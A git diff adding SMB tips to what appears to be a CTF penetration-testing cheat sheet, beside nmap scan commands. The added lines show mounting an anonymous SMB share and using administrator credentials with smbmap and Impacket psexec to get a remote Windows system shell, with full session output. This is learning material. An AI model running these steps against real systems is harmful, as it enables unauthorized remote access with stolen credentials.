@@ -25,6 +25,38 @@ tags:
   * `nmap -sS -T4 -A -p- <HOST_IP>` -- Useful for All Ports, SYN Scan and OS detection
   * `nmap --script ssl-enum-ciphers -p 443  <HOST_IP>` -- Gives rating for SSL Ciphers
 * If port 80 is open, use robots.txt to find any hidden flags.
+* If Anonymous SMB is open, we can mount shares like this .
+  ```root@kali:~/CTF# mkdir /mnt/smb
+  root@kali:~/CTF# mount -t cifs //<HOST_IP>/Backups /mnt/smb/
+  Password for root@//<HOST_IP>/Backups: 
+  ```
+* If we found Administrator Creds, we can use this method to get root shell.
+  ```root@kali:/opt/impacket/examples# smbmap -u administrator -p password -H <HOST_IP>
+  [+] Finding open SMB ports....
+  [+] User SMB session establishd on <HOST_IP>...
+  [+] IP: <HOST_IP>:445	Name: <HOST_IP>                                      
+	 Disk                                                  	Permissions
+	 ----                                                  	-----------
+	 ADMIN$                                            	READ, WRITE
+	 Backups                                           	READ, WRITE
+	 C$                                                	READ, WRITE
+	 IPC$                                              	READ ONLY
+  root@kali:/opt/impacket/examples# python psexec.py administrator@<HOST_IP>
+  Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+  Password:
+  [*] Requesting shares on <HOST_IP>.....
+  [*] Found writable share ADMIN$
+  [*] Uploading file tJJmcVQN.exe
+  [*] Opening SVCManager on <HOST_IP>.....
+  [*] Creating service RKAe on <HOST_IP>....
+  [*] Starting service RKAe.....
+  [!] Press help for extra shell commands
+  Microsoft Windows [Version 10.0.14393]
+  (c) 2016 Microsoft Corporation. All rights reserved.
+
+  C:\Windows\system32>
+  ```
 * If Webserver is running, we can find the Server version using
   * `curl --header <SERVER_IP>`
 * If we want to find exploit of a particular version, use the command
